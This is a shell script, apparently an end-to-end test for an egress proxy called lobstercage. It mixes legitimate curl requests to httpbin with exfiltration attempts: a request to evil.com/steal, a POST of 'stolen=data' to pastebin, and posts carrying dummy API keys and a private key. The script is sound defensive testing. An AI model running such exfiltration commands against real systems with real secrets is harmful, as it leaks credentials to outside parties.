#!/bin/sh
set -e

echo "=== lobstercage curl e2e test ==="
echo "Using proxy: $HTTP_PROXY"
echo ""

run() {
    label="$1"; shift
    echo "[$label]"
    # curl uses HTTP_PROXY automatically; -x is explicit fallback
    set +e
    output=$(curl -s -w "\n  HTTP %{http_code}" "$@" 2>&1)
    set -e
    echo "$output" | head -5
    echo ""
}

# ── Legit ──────────────────────────────────────────────

run "LEGIT GET — httpbin.org/get" \
    http://httpbin.org/get

run "LEGIT POST — httpbin.org/post (clean body)" \
    -X POST -H "Content-Type: application/json" \
    -d '{"message":"hello from curl","count":99}' \
    http://httpbin.org/post

# ── Blocked domain ────────────────────────────────────

run "EXFIL — evil.com (not in allowlist)" \
    http://evil.com/steal

run "EXFIL — pastebin.com (not in allowlist)" \
    -X POST -d "stolen=data" \
    http://pastebin.com/api

# ── Secret leak ───────────────────────────────────────

run "EXFIL — Anthropic key in body" \
    -X POST -H "Content-Type: application/json" \
    -d '{"key":"sk-ant-abc123DEF456ghi789JKL012mno345PQR678stu901VWX"}' \
    http://httpbin.org/post

run "EXFIL — Anthropic key in body" \
    -X POST -H "Content-Type: text/plain" \
    -d "token=sk-ant-ABCDEF1234567890abcdefghijkl" \
    http://httpbin.org/post

run "EXFIL — AWS key in header" \
    -H "X-Api-Key: AKIAIOSFODNN7EXAMPLE" \
    http://httpbin.org/get

run "EXFIL — private key in body" \
    -X POST -H "Content-Type: text/plain" \
    -d "-----BEGIN RSA PRIVATE KEY-----
MIIBogIBAAJBALRiMLQz...fake...key
-----END RSA PRIVATE KEY-----" \
    http://httpbin.org/post

# ── Another legit request ─────────────────────────────

run "LEGIT GET — httpbin.org/headers" \
    http://httpbin.org/headers

echo "=== curl test complete ==="
